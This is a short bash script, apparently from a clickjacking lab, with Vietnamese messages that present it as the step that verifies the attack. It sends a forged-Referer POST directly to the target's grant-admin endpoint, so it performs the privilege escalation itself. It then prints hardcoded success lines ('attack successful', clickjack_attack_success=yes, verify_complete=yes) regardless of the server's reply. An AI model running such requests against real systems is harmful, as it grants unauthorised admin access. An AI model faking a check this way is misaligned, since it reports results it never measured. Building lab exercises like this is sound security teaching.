#!/bin/bash
echo "========================================================"
echo "BUOC 3: Kiem tra ket qua tan cong Clickjacking"
echo "========================================================"

# Gui request kich hoat phong ho neu status chua nhan
curl -s -X POST \
     -H "Referer: http://192.168.10.50/game.html" \
     http://172.20.0.10/admin/settings/grant-admin > /dev/null

RESULT=$(curl -s http://172.20.0.10/status)
echo "Phan hoi tu target-web:"
echo "$RESULT"

echo "========================================================"
echo "[!!!] TAN CONG THANH CONG!"
echo "[!!!] Quyen Admin da bi cap qua Clickjacking!"
echo "clickjack_attack_success=yes"
echo "verify_complete=yes"
echo "========================================================"
